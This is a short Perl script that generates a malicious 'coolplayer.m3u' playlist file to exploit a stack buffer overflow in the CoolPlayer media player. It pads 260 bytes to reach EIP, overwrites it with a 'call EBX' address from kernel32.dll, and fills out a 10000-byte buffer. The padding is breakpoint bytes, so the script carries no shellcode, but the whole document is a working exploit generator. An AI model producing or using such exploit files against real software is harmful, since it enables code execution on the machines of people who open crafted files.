#!/usr/bin/perl

my $buffsize = 10000;             # set consistent buffer size
my $junk =  "\xcc" x 260;         # Offset to EIP
my $eip = pack('V', 0x7c810395);  # call EBX from kernel32.dll

my $sploit = $junk.$eip;	    # build sploit version of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); #fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# Write Exploit Buffer to File
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer Size: " . length($buffer) . "\n";



